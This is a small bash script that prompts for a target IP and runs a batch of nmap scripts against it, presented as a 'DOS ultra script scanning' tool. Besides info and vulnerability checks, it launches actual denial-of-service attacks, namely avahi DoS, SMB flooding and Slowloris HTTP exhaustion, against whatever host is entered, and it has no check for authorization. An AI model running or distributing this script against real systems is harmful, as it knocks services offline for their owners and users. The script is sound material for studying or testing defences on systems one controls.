#!/bin/bash
#CodedByvDroPZz
#WhiteSiteHacking
#
#
echo "Ultra NMAP (script) scan Tool"
echo "#WhiteHatSupports"
echo "DOS script scans"
echo
echo
echo "Type in Target IP:"
read TARGET;
clear
echo
echo
echo
echo "DOS ultra script scanning starts"
echo
echo
echo
echo
echo
nmap -Pn $TARGET --script broadcast-avahi-dos.nse
nmap -Pn $TARGET --script http-slowloris-check.nse
nmap -Pn $TARGET --script memcached-info.nse
nmap -Pn $TARGET --script membase-http-info.nse
nmap -Pn $TARGET --script smb-flood.nse 
nmap -Pn $TARGET --script http-slowloris.nse
echo
echo
echo
echo
echo
echo "Thank you for using my tool!"
echo "._____________________________________________."
echo "|#           __            ___ ______        #|"
echo "|  __    __ || *\  _ _    ||*.|     //        |"
echo "| \* \  / / || | ||*//___ | __| __ //__ ____  |"
echo "|  \* \/ /  || | /| || *.||||    //_____/ //_ |"
echo "|   \___/   ||__/ |_||___||_|   //_____/_//__ |"
echo "._____________________________________________."
echo "bye!"
exit
/bin/sh